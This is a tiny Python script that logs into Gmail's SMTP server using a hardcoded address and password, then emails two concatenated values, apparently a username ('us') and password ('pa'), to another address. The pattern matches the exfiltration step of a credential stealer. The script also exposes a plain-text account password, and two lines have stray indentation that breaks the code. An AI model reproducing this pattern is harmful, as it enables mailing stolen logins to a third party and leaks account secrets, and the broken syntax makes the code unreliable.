import smtplib
 
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("20xxismailxx19@gmail.com", "gmail2019")
 us="fdzhkjfhd"
 pa="kdjkjvk;jffdk"
msg = us+pa
server.sendmail("20xxismailxx19@gmail.com", "ismailiaraben@gmail.com", msg)
server.quit()